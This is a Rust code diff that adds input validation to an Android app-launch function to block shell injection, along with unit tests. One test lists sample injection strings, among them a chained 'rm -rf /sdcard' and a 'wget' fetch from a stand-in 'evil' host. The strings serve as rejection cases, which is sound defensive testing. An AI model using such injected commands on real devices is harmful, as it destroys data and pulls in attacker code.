@@ -44,7 +44,20 @@ pub fn list_apps(
 }
 
 /// Force-stop then monkey-launch an app by package name.
+///
+/// `package_name` must consist only of letters, digits, underscores, and dots
+/// (the standard Android package name character set).  Anything else is
+/// rejected to prevent shell injection via `shell_args`.
 pub fn launch_app(device: &mut AndroidDevice, package_name: &str) -> Result<(), String> {
+    // Validate to prevent shell injection: only allow letters, digits, dot, underscore.
+    if package_name.is_empty()
+        || !package_name.chars().all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '_')
+    {
+        return Err(format!(
+            "Invalid package name '{package_name}': only [a-zA-Z0-9._] are allowed"
+        ));
+    }
+
     // Force-stop first so the app starts fresh.
     device.shell_args(&["am", "force-stop", package_name]).ok();
 
@@ -238,5 +251,33 @@ mod tests {
     fn key_name_mapping() {
         assert_eq!(key_name_to_keycode("home"), "KEYCODE_HOME");
         assert_eq!(key_name_to_keycode("KEYCODE_ENTER"), "KEYCODE_ENTER");
+    }
+
+    #[test]
+    fn launch_app_rejects_injection() {
+        // Can't call launch_app without a device, but we can test the validation logic directly.
+        let bad_names = [
+            "com.foo; rm -rf /sdcard",
+            "com.foo && wget http://evil/p",
+            "",
+            "com.foo/bar",
+        ];
+        for name in &bad_names {
+            assert!(
+                name.is_empty() || !name.chars().all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '_'),
+                "Expected '{name}' to be rejected"
+            );
+        }
+    }
+
+    #[test]
+    fn launch_app_accepts_valid_package_name() {
+        let good_names = ["com.android.chrome", "org.example.app_v2", "com.foo.Bar123"];
+        for name in &good_names {
+            assert!(
+                !name.is_empty() && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '_'),
+                "Expected '{name}' to be accepted"
+            );
+        }
     }
 }
